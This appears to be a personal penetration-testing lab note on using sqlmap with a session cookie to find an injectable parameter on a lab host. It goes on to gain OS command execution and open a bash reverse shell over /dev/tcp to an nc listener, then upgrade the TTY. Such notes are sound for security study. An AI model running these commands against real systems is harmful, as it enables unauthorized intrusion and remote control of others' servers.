# SQLMap
﷽
* Open-source tool for detecting SQLIs.

## usage

* we have to provide `sqlmap` with an URL and a cookie for it to find vulnerabilities.
### cookie aquiring
  * burp can be used by intercepting a request, or
  * an extension called `cookie-editor` can be added on to browser.
#### using cookie-editor
  * to use cookie-editor:
    * click on a cookie
    * the syntax will be like `name={name} and value={value}`
    * so, the cookie becomes {name}={value}, like:
    `PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1`

* our `sqlmap` query becomes something like:
  * `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --
cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"`

  * respond to the questions the tool asks you with `y`, or `no` with `ENTER` being the default choice.

* in my case, I got the output `GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]`.
  * this confirms the website is SQLI-prone.

* now, use the `--os-shell` flag, so we can get **command execution**:
  * `sqlmap -u '{website}' --cookie="{cookie}" --os-shell`

* to get a fully interactive shell, use `nc`:
* create a `nc` listener:
  * `sudo nc -lvnp 443`
* then, execute the following payload on the SQLMap server:
  * `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`

* we can make the shell fully vulnerable by using the following (on the `nc` shell):

  `python3 -c 'import pty;pty.spawn("/bin/bash")'
  CTRL+Z
  stty raw -echo
  fg
  export TERM=xterm`



